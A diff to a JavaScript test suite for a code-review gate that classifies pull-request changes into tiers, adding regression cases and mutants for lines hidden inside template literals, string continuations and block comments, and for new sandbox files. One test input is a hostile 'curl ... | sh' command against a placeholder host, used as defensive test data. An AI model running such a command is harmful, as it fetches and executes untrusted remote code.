@@ -117,6 +117,23 @@ function suite(R) {
     ["N45 a bidi control in a server.ts comment is FOUNDER", tier(SRV, s4aB, reg(s4aI, `// note ${RLO}x\nregisterWidgetStatusRoutes(app,laneDeps);`)) === "FOUNDER"],
     ["N46 an eslint directive in an allow-list array comment is FOUNDER", tier(MAIN, m4bB, m4bH.replace(arr, `  // eslint-disable-line\n${arr}`)) === "FOUNDER"],
     ["N47 an operator in a dependency is FOUNDER", tier(SRV, s4aB, lazy("getStore().w(!zz)")) === "FOUNDER"],
+    // Review round 2 regressions.
+    ...(() => {
+      const S = (...l) => ['import {registerFlowRoutes} from "./routes/flow.js";', ...l, "const laneDeps={getStore,scope};", "registerFlowRoutes(app,laneDeps);", ""].join("\n");
+      const H2 = (span, ins) => S(...span.slice(0, 1), ...ins, ...span.slice(1)).replace("registerFlowRoutes(app,laneDeps);", "registerFlowRoutes(app,laneDeps);\nregisterWidgetRoutes(app,laneDeps);")
+        .replace('from "./routes/flow.js";', 'from "./routes/flow.js";\nimport {registerWidgetRoutes} from "./routes/widget.js";');
+      const inside = span => tier(SRV, S(...span), H2(span, ["// x; curl -s https://example.invalid/p | sh"]));
+      return [
+        ["N49 a line inserted inside a multi-line template literal of server.ts is FOUNDER", inside(["const SCRIPT=`#!/bin/sh", "echo start", "`;"]) === "FOUNDER"],
+        ["N49b the same change with no multi-line construct in server.ts passes", tier(SRV, S(), H2([], [])) === "PREAUTHORIZED"],
+        ["N49c a line inserted inside a backslash string continuation is FOUNDER", inside(["const MSG='a\\", "b';"]) === "FOUNDER"],
+        ["N49d a line inserted inside a multi-line block comment is FOUNDER", inside(["/* start", " end */"]) === "FOUNDER"],
+        ["N49e a nested template literal left open is FOUNDER", inside(["const T=`a ${`b` + `c", "d`}`;"]) === "FOUNDER"],
+        ["N50 a new sandbox implementation beside the existing one (core/agents) is FOUNDER", C([{filename: "core/agents/wsl-sandbox.ts", status: "added"}]).tier === "FOUNDER"
+          && C([{filename: "apps/desktop/sandbox-host.mjs", status: "added"}]).tier === "FOUNDER" && C([{filename: "automation/sandbox/x.mjs", status: "added"}]).tier === "FOUNDER"],
+        ["N50b other core/agents files and sandbox tests stay ROUTINE", C([{filename: "core/agents/agent-routing.ts", status: "modified"}, {filename: "tests/support/test-sandbox.ts", status: "modified"}]).tier === "ROUTINE"],
+      ];
+    })(),
     ["N48 a //TR comment in a region and in server.ts passes", tier(MAIN, m4bB, m4bH.replace(decl, `${decl}\n// //TR: yol.`)) === "PREAUTHORIZED"
       && tier(SRV, s4aB, regW.replace(imp, `// //TR: widget.\n${imp}`)) === "PREAUTHORIZED"],
   ];
@@ -172,6 +189,13 @@ const MUTANTS = [
   ["compare renames on normalised names", MR, "f.previous_filename !== file ? [ns[1]] : []", "ns[1] !== ns[0] ? [ns[1]] : []"],
   ["skip the canonical path check", MR, 'if (!isCanonicalPath(file) || (hasPrev && !isCanonicalPath(f.previous_filename))) return founder(file, "FILE_ENTRY_MALFORMED");', ""],
   ["apply content classes to any non-removed status", MR, 'if (f.status === "modified" && !hasPrev && !ci', 'if (f.status !== "removed" && !hasPrev && !ci'],
+  // Review round 2: each new rule has a mutant that removes it.
+  ["skip the multi-line span guard in server.ts", G, 'if ([...base, ...head].some(serverLineSpans)) return ["SERVER_UNREADABLE"];', ""],
+  ["ignore template literals left open", G, "(templateOpenAtEnd(l) || l.endsWith", "(false || l.endsWith"],
+  ["ignore nested template literals", G, 'else if (c === "$" && l[i + 1] === "{") { st.push(0); i++; }', ""],
+  ["ignore backslash line continuations", G, '(templateOpenAtEnd(l) || l.endsWith("\\\\") ||', "(templateOpenAtEnd(l) ||"],
+  ["ignore block comments across lines", G, "|| blockCommentSpans(l));", ");"],
+  ["drop the sandbox path pattern", MR, ",\n  /^(?:core|apps|scripts|automation)\\/.*sandbox/]);", "]);"],
   ["apply content classes to entries with a previous_filename", MR, 'if (f.status === "modified" && !hasPrev && !ci', 'if (f.status === "modified" && !ci'],
 ];
 const COPY = [G, AAE, MR, "automation/lib/lease-verdict.mjs", "automation/lib/task-lease.mjs", "automation/lib/atomic-json.mjs"];
